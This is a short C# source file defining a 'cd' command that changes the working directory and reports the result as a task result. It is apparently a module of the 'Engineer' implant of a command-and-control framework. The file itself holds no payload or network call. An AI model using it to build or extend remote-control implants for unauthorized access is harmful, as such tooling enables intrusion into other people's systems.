using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
	public class ChangeDirectory : EngineerCommand
	{
		public override string Name => "cd" ;
	
	public override async Task Execute(EngineerTask task)
		{
			try
			{
				if (!task.Arguments.TryGetValue("/path", out string path)) // if it fails to get a value from this argument then it will use the current path
				{
					path = Directory.GetCurrentDirectory();
				}
				Directory.SetCurrentDirectory(path);
                Tasking.FillTaskResults(Directory.GetCurrentDirectory(),task,EngTaskStatus.Complete,TaskResponseType.String); // needs a return since string should print updated dir.
			}
			catch (Exception ex)
			{
               Tasking.FillTaskResults("error: " + ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
			}
		}
	}
}
